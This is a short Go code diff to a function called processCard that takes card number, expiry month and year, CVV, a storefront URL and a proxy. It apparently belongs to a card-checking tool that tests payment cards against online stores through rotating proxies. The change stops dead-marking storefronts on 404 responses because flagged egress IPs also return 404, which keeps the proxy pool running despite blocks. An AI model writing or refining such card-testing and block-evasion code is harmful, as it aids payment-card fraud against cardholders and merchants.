@@ -1032,9 +1032,10 @@ func processCard(ctx context.Context, cc, mes, ano, cvv, siteURL, variantID, pro
 		stageCancel()
 	}
 	if err != nil || (status != 200 && status != 302) {
-		// Dead storefront (404/410): mark dead once, return distinct verdict — never a retry burn
+		// Dead storefront (404/410): distinct verdict, but NEVER dead-mark —
+		// a flagged egress IP also reads as 404, and marking poisons the whole
+		// pool for an hour (every rotation then fast-fails). Audit purges these.
 		if status == 404 || status == 410 {
-			markDeadStore(baseURL, "NOT_FOUND", 60*time.Minute)
 			res.Message = "DEAD_STORE:NOT_FOUND"
 			if proxyStr != "" {
 				res.Proxy = "Dead"
